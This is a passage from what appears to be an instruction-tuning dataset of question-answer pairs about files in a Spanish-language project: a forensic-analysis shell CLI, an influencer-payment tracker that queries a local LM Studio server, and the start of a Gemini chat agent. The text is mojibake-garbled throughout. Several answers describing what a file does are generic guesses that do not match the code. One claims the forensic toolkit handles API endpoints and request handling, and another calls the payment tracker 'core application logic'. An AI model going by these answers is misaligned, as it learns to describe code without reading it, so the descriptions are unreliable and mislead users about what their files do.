â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n# MAIN\n# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n\nmain() {\n    local cmd=\"$1\"\n    shift || true\n\n    case \"$cmd\" in\n        analyze|scan)\n            analyze \"$@\"\n            ;;\n        extract|entities)\n            extract \"$@\"\n            ;;\n        ai|smart)\n            ai_analyze \"$@\"\n            ;;\n        timeline|time)\n            timeline \"$@\"\n            ;;\n        hash|checksum)\n            hash_file \"$@\"\n            ;;\n        reports|list)\n            reports\n            ;;\n        social)\n            social_analyze \"$@\"\n            ;;\n        help|-h|--help|\"\")\n            banner\n            echo \"Comandos:\"\n            echo \"\"\n            echo \"  ${GREEN}AnÃ¡lisis:${NC}\"\n            echo \"    4exe analyze <archivo|texto>     AnÃ¡lisis forense completo\"\n            echo \"    4exe extract <target> [type]     Extraer entidades (emails,ips,urls)\"\n            echo \"    4exe ai <target> [query]         AnÃ¡lisis con IA (LM Studio)\"\n            echo \"\"\n            echo \"  ${GREEN}Archivos:${NC}\"\n            echo \"    4exe hash <archivo>              Calcular hashes\"\n            echo \"    4exe timeline <archivo>          Timeline del archivo\"\n            echo \"\"\n            echo \"  ${GREEN}Social Media:${NC}\"\n            echo \"    4exe social <platform> <user>    Analizar perfil social\"\n            echo \"\"\n            echo \"  ${GREEN}Reportes:${NC}\"\n            echo \"    4exe reports                     Listar reportes generados\"\n            echo \"\"\n            ;;\n        *)\n            err \"Comando desconocido: $cmd\"\n            echo \"Usa: 4exe help\"\n            ;;\n    esac\n}\n\nmain \"$@\"\n\n```"}
{"instruction": "What does the file 4exe.sh do?", "input": "```sh\n#!/bin/bash\n# â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—\n# â•‘  4EXE (FORENSIC) - Data Forensics & Analysis Toolkit          â•‘\n# â•‘  patru = 4 | exe = executable | 4ensic = forensic             â•‘\n# â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n\nset -e\n\nSCRIPT_DIR=\"$(cd \"$(dirname \"${BASH_SOURCE[0]}\")\" && pwd)\"\nCORLEONE_DIR=\"$(dirname \"$SCRIPT_DIR\")\"\nsource \"$CORLEONE_DIR/config.env\" 2>/dev/null || true\n\n# Config\nVERSION=\"1.0.0\"\nDATA_DIR=\"$SCRIPT_DIR/evidence\"\nREPORTS_DIR=\"$SCRIPT_DIR/reports\"\nLM_STUDIO_URL=\"${LM_STUDIO_URL:-http://192.168.192.2:1234/v1}\"\n\nmkdir -p \"$DATA_DIR\" \"$REPORTS_DIR\"\n\n# Colors\nRED='\\033[0;31m'\nGREEN='\\033[0;32m'\nYELLOW='\\033[1;33m'\nCYAN='\\033[0;36m'\nMAGENTA='\\033[0;35m'\nWHITE='\\033[1;37m'\nNC='\\033[0m'\n\nbanner() {\n    echo -e \"${CYAN}\"\n    echo \"â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—\"\n    echo \"â•‘   â–ˆâ–ˆâ•—  â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•—  â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—                            â•‘\"\n    echo \"â•‘   â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•â•â•â•šâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•”â•â•â•â•â•                            â•‘\"\n    echo \"â•‘   â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—   â•šâ–ˆâ–ˆâ–ˆâ•”â• â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—                              â•‘\"\n    echo \"â•‘   â•šâ•â•â•â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•   â–ˆâ–ˆâ•”â–ˆâ–ˆâ•— â–ˆâ–ˆâ•”â•â•â•                              â•‘\"\n    echo \"â•‘        â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â• â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—                            â•‘\"\n    echo \"â•‘        â•šâ•â•â•šâ•â•â•â•â•â•â•â•šâ•â•  â•šâ•â•â•šâ•â•â•â•â•â•â•                            â•‘\"\n    echo \"â•‘                                                               â•‘\"\n    echo \"â•‘   4EXE FORENSIC - Data Analysis & Intelligence Toolkit        â•‘\"\n    echo \"â•‘   v$VERSION | patru=4 | exe=executable | 4ensic=forensic          â•‘\"\n    echo \"â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\"\n    echo -e \"${NC}\"\n}\n\nlog() { echo -e \"${GREEN}[4EXE]${NC} $1\"; }\nwarn() { echo -e \"${YELLOW}[WARN]${NC} $1\"; }\nerr() { echo -e \"${RED}[ERROR]${NC} $1\"; }\ninfo() { echo -e \"${CYAN}[INFO]${NC} $1\"; }\n\n# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n# FORENSIC ANALYSIS\n# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n```", "output": "This file `4exe.sh` is part of the 4exe project. Based on the code structure, it appears to handle API endpoints and request handling."}
{"instruction": "Show me the code for patru.sh which is part of the 4exe project.", "input": "", "output": "Here's the code for `pipeline\\corleone\\4exe\\patru.sh`:\n\n```sh\n#!/bin/bash\n# â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—\n# â•‘  PATRU.EXE - Influencer Management Toolkit                    â•‘\n# â•‘  Instagram Integration + Influencer Payments                  â•‘\n# â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n\nset -e\n\nSCRIPT_DIR=\"$(cd \"$(dirname \"${BASH_SOURCE[0]}\")\" && pwd)\"\nCORLEONE_DIR=\"$(dirname \"$SCRIPT_DIR\")\"\nsource \"$CORLEONE_DIR/config.env\" 2>/dev/null || true\n\n# ConfiguraciÃ³n\nPATRU_VERSION=\"1.0.0\"\nPATRU_DATA=\"$SCRIPT_DIR/data\"\nPATRU_DB=\"$SCRIPT_DIR/influencers.json\"\nLM_STUDIO_URL=\"${LM_STUDIO_URL:-http://192.168.192.2:1234/v1}\"\n\n# Colores\nRED='\\033[0;31m'\nGREEN='\\033[0;32m'\nYELLOW='\\033[1;33m'\nCYAN='\\033[0;36m'\nMAGENTA='\\033[0;35m'\nNC='\\033[0m'\n\n# Banner\nshow_banner() {\n    echo -e \"${MAGENTA}\"\n    echo \"â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—\"\n    echo \"â•‘     â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ•—   â–ˆâ–ˆâ•—           â•‘\"\n    echo \"â•‘     â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â•šâ•â•â–ˆâ–ˆâ•”â•â•â•â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘           â•‘\"\n    echo \"â•‘     â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘           â•‘\"\n    echo \"â•‘     â–ˆâ–ˆâ•”â•â•â•â• â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘           â•‘\"\n    echo \"â•‘     â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•           â•‘\"\n    echo \"â•‘     â•šâ•â•     â•šâ•â•  â•šâ•â•   â•šâ•â•   â•šâ•â•  â•šâ•â• â•šâ•â•â•â•â•â•            â•‘\"\n    echo \"â•‘                                                           â•‘\"\n    echo \"â•‘     Influencer Management + Instagram Payments            â•‘\"\n    echo \"â•‘     v$PATRU_VERSION                                              â•‘\"\n    echo \"â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\"\n    echo -e \"${NC}\"\n}\n\nlog() { echo -e \"${GREEN}[PATRU]${NC} $1\"; }\nwarn() { echo -e \"${YELLOW}[WARN]${NC} $1\"; }\nerror() { echo -e \"${RED}[ERROR]${NC} $1\"; }\n\n# Inicializar base de datos de influencers\ninit_db() {\n    if [[ ! -f \"$PATRU_DB\" ]]; then\n        echo '{\"influencers\":[],\"payments\":[],\"campaigns\":[]}' > \"$PATRU_DB\"\n        log \"Base de datos creada: $PATRU_DB\"\n    fi\n}\n\n# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n# INSTAGRAM FUNCTIONS\n# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n\n# Agregar influencer\ninfluencer_add() {\n    local username=\"$1\"\n    local platform=\"${2:-instagram}\"\n    local rate=\"${3:-0}\"\n    local category=\"${4:-general}\"\n\n    init_db\n\n    local entry=$(cat <<EOF\n{\n    \"id\": \"$(date +%s)\",\n    \"username\": \"$username\",\n    \"platform\": \"$platform\",\n    \"rate_per_post\": $rate,\n    \"category\": \"$category\",\n    \"status\": \"active\",\n    \"total_paid\": 0,\n    \"posts_done\": 0,\n    \"added_date\": \"$(date -Iseconds)\"\n}\nEOF\n)\n\n    # Agregar al JSON\n    local tmp=$(mktemp)\n    jq \".influencers += [$entry]\" \"$PATRU_DB\" > \"$tmp\" && mv \"$tmp\" \"$PATRU_DB\"\n\n    log \"Influencer agregado: @$username ($platform)\"\n    echo \"  Rate: \\$$rate/post | CategorÃ­a: $category\"\n}\n\n# Listar influencers\ninfluencer_list() {\n    init_db\n    echo -e \"${CYAN}â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}\"\n    echo -e \"${CYAN}  INFLUENCERS DATABASE${NC}\"\n    echo -e \"${CYAN}â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}\"\n\n    jq -r '.influencers[] | \"  @\\(.username) | \\(.platform) | $\\(.rate_per_post)/post | \\(.category) | Paid: $\\(.total_paid)\"' \"$PATRU_DB\" 2>/dev/null || echo \"  (vacÃ­o)\"\n\n    echo \"\"\n}\n\n# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n# PAYMENT FUNCTIONS\n# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n\n# Registrar pago a influencer\npayment_add() {\n    local username=\"$1\"\n    local amount=\"$2\"\n    local description=\"${3:-Post promocional}\"\n    local method=\"${4:-paypal}\"\n\n    init_db\n\n    local payment=$(cat <<EOF\n{\n    \"id\": \"PAY-$(date +%s)\",\n    \"influencer\": \"$username\",\n    \"amount\": $amount,\n    \"description\": \"$description\",\n    \"method\": \"$method\",\n    \"status\": \"pending\",\n    \"date\": \"$(date -Iseconds)\"\n}\nEOF\n)\n\n    # Agregar pago\n    local tmp=$(mktemp)\n    jq \".payments += [$payment]\" \"$PATRU_DB\" > \"$tmp\" && mv \"$tmp\" \"$PATRU_DB\"\n\n    # Actualizar total pagado al influencer\n    jq \"(.influencers[] | select(.username == \\\"$username\\\") | .total_paid) += $amount\" \"$PATRU_DB\" > \"$tmp\" && mv \"$tmp\" \"$PATRU_DB\"\n    jq \"(.influencers[] | select(.username == \\\"$username\\\") | .posts_done) += 1\" \"$PATRU_DB\" > \"$tmp\" && mv \"$tmp\" \"$PATRU_DB\"\n\n    log \"Pago registrado: @$username - \\$$amount\"\n    echo \"  DescripciÃ³n: $description\"\n    echo \"  MÃ©todo: $method\"\n    echo \"  ID: PAY-$(date +%s)\"\n}\n\n# Listar pagos\npayment_list() {\n    init_db\n    echo -e \"${CYAN}â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}\"\n    echo -e \"${CYAN}  PAYMENT HISTORY${NC}\"\n    echo -e \"${CYAN}â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}\"\n\n    jq -r '.payments[] | \"  \\(.id) | @\\(.influencer) | $\\(.amount) | \\(.method) | \\(.status)\"' \"$PATRU_DB\" 2>/dev/null || echo \"  (sin pagos)\"\n\n    local total=$(jq '[.payments[].amount] | add // 0' \"$PATRU_DB\")\n    echo \"\"\n    echo -e \"  ${GREEN}Total pagado: \\$$total${NC}\"\n    echo \"\"\n}\n\n# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n# CAMPAIGN FUNCTIONS\n# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n\n# Crear campaÃ±a\ncampaign_create() {\n    local name=\"$1\"\n    local budget=\"$2\"\n    local target=\"${3:-engagement}\"\n\n    init_db\n\n    local campaign=$(cat <<EOF\n{\n    \"id\": \"CAMP-$(date +%s)\",\n    \"name\": \"$name\",\n    \"budget\": $budget,\n    \"spent\": 0,\n    \"target\": \"$target\",\n    \"status\": \"active\",\n    \"influencers\": [],\n    \"created\": \"$(date -Iseconds)\"\n}\nEOF\n)\n\n    local tmp=$(mktemp)\n    jq \".campaigns += [$campaign]\" \"$PATRU_DB\" > \"$tmp\" && mv \"$tmp\" \"$PATRU_DB\"\n\n    log \"CampaÃ±a creada: $name\"\n    echo \"  Budget: \\$$budget | Target: $target\"\n}\n\n# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n# AI CONTENT GENERATION (via LM Studio)\n# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n\ncontent_generate() {\n    local topic=\"$1\"\n    local platform=\"${2:-instagram}\"\n    local style=\"${3:-engaging}\"\n\n    log \"Generando contenido con IA...\"\n\n    local prompt=\"Eres un experto en marketing de influencers para $platform.\nGenera 3 ideas de posts sobre: $topic\nEstilo: $style\nIncluye: caption, hashtags sugeridos, mejor hora para publicar.\nFormato: JSON\"\n\n    local response=$(curl -s \"$LM_STUDIO_URL/chat/completions\" \\\n        -H \"Content-Type: application/json\" \\\n        -d \"{\n            \\\"model\\\": \\\"local-model\\\",\n            \\\"messages\\\": [{\\\"role\\\": \\\"user\\\", \\\"content\\\": \\\"$prompt\\\"}],\n            \\\"temperature\\\": 0.8\n        }\" 2>/dev/null)\n\n    if [[ -n \"$response\" ]]; then\n        echo \"$response\" | jq -r '.choices[0].message.content' 2>/dev/null || echo \"$response\"\n    else\n        warn \"LM Studio no disponible. Inicia el servidor en Windows.\"\n    fi\n}\n\n# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n# ANALYTICS\n# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n\nanalytics_summary() {\n    init_db\n    echo -e \"${CYAN}â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}\"\n    echo -e \"${CYAN}  PATRU ANALYTICS SUMMARY${NC}\"\n    echo -e \"${CYAN}â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}\"\n\n    local total_influencers=$(jq '.influencers | length' \"$PATRU_DB\")\n    local total_payments=$(jq '[.payments[].amount] | add // 0' \"$PATRU_DB\")\n    local total_posts=$(jq '[.influencers[].posts_done] | add // 0' \"$PATRU_DB\")\n    local active_campaigns=$(jq '[.campaigns[] | select(.status == \"active\")] | length' \"$PATRU_DB\")\n\n    echo \"\"\n    echo \"  Influencers:      $total_influencers\"\n    echo \"  Total pagado:     \\$$total_payments\"\n    echo \"  Posts realizados: $total_posts\"\n    echo \"  CampaÃ±as activas: $active_campaigns\"\n    echo \"\"\n\n    if [[ $total_posts -gt 0 ]]; then\n        local avg_cost=$((total_payments / total_posts))\n        echo \"  Costo promedio/post: \\$$avg_cost\"\n    fi\n    echo \"\"\n}\n\n# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n# MAIN\n# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n\nmain() {\n    local cmd=\"$1\"\n    shift || true\n\n    case \"$cmd\" in\n        # Influencers\n        add|influencer-add)\n            influencer_add \"$@\"\n            ;;\n        list|influencers)\n            influencer_list\n            ;;\n\n        # Payments\n        pay|payment)\n            payment_add \"$@\"\n            ;;\n        payments)\n            payment_list\n            ;;\n\n        # Campaigns\n        campaign)\n            campaign_create \"$@\"\n            ;;\n\n        # Content\n        content|generate)\n            content_generate \"$@\"\n            ;;\n\n        # Analytics\n        stats|analytics)\n            analytics_summary\n            ;;\n\n        # Help\n        help|-h|--help|\"\")\n            show_banner\n            echo \"Comandos:\"\n            echo \"\"\n            echo \"  ${GREEN}Influencers:${NC}\"\n            echo \"    patru add <@user> [platform] [rate] [category]\"\n            echo \"    patru list\"\n            echo \"\"\n            echo \"  ${GREEN}Pagos:${NC}\"\n            echo \"    patru pay <@user> <amount> [description] [method]\"\n            echo \"    patru payments\"\n            echo \"\"\n            echo \"  ${GREEN}CampaÃ±as:${NC}\"\n            echo \"    patru campaign <name> <budget> [target]\"\n            echo \"\"\n            echo \"  ${GREEN}Contenido (IA):${NC}\"\n            echo \"    patru content <topic> [platform] [style]\"\n            echo \"\"\n            echo \"  ${GREEN}Analytics:${NC}\"\n            echo \"    patru stats\"\n            echo \"\"\n            ;;\n\n        *)\n            error \"Comando desconocido: $cmd\"\n            echo \"Usa: patru help\"\n            ;;\n    esac\n}\n\nmain \"$@\"\n\n```"}
{"instruction": "What does the file patru.sh do?", "input": "```sh\n#!/bin/bash\n# â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—\n# â•‘  PATRU.EXE - Influencer Management Toolkit                    â•‘\n# â•‘  Instagram Integration + Influencer Payments                  â•‘\n# â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n\nset -e\n\nSCRIPT_DIR=\"$(cd \"$(dirname \"${BASH_SOURCE[0]}\")\" && pwd)\"\nCORLEONE_DIR=\"$(dirname \"$SCRIPT_DIR\")\"\nsource \"$CORLEONE_DIR/config.env\" 2>/dev/null || true\n\n# ConfiguraciÃ³n\nPATRU_VERSION=\"1.0.0\"\nPATRU_DATA=\"$SCRIPT_DIR/data\"\nPATRU_DB=\"$SCRIPT_DIR/influencers.json\"\nLM_STUDIO_URL=\"${LM_STUDIO_URL:-http://192.168.192.2:1234/v1}\"\n\n# Colores\nRED='\\033[0;31m'\nGREEN='\\033[0;32m'\nYELLOW='\\033[1;33m'\nCYAN='\\033[0;36m'\nMAGENTA='\\033[0;35m'\nNC='\\033[0m'\n\n# Banner\nshow_banner() {\n    echo -e \"${MAGENTA}\"\n    echo \"â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—\"\n    echo \"â•‘     â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ•—   â–ˆâ–ˆâ•—           â•‘\"\n    echo \"â•‘     â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â•šâ•â•â–ˆâ–ˆâ•”â•â•â•â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘           â•‘\"\n    echo \"â•‘     â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘           â•‘\"\n    echo \"â•‘     â–ˆâ–ˆâ•”â•â•â•â• â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘           â•‘\"\n    echo \"â•‘     â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•           â•‘\"\n    echo \"â•‘     â•šâ•â•     â•šâ•â•  â•šâ•â•   â•šâ•â•   â•šâ•â•  â•šâ•â• â•šâ•â•â•â•â•â•            â•‘\"\n    echo \"â•‘                                                           â•‘\"\n    echo \"â•‘     Influencer Management + Instagram Payments            â•‘\"\n    echo \"â•‘     v$PATRU_VERSION                                              â•‘\"\n    echo \"â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\"\n    echo -e \"${NC}\"\n}\n\nlog() { echo -e \"${GREEN}[PATRU]${NC} $1\"; }\nwarn() { echo -e \"${YELLOW}[WARN]${NC} $1\"; }\nerror() { echo -e \"${RED}[ERROR]${NC} $1\"; }\n\n# Inicializar base de datos de influencers\ninit_db() {\n    if [[ ! -f \"$PATRU_DB\" ]]; then\n        echo '{\"influencers\":[],\"payments\":[],\"campaigns\":[]}' > \"$PATRU_DB\"\n        log \"Base de datos creada: $PATRU_DB\"\n    fi\n}\n\n# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n```", "output": "This file `patru.sh` is part of the 4exe project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for index.js which is part of the cli project.", "input": "", "output": "Here's the code for `cli\\index.js`:\n\n```js\n#!/usr/bin/env node\n/**\n * ANTIGRAVITY - Direct Chat Agent\n * Uses Gemini (GCP) with fallback to local LLM\n */\n\nimport chalk from 'chalk';\nimport ora from 'ora';\nimport figlet from 'figlet';\nimport gradient from 'gradient-string';\nimport readline from 'readline';\nimport fs from 'fs';\nimport path from 'path';\nimport { fileURLToPath } from 'url';\n\nconst __dirname = path.dirname(fileURLToPath(import.meta.url));\n\n// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• CONFIG â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\nconst CONFIG = {\n    gemini: {\n        project: 'gen-lang-client-0988614926',\n        location: 'us-central1',\n        model: 'gemini-1.5-flash'\n    },\n    localLLM: 'http://localhost:1234/v1/chat/completions',\n    serviceAccountPath: path.join(__dirname, '..', 'pipeline', 'keys', 'service-account.json')\n};\n\nlet history = [];\nlet accessToken = null;\n\n// 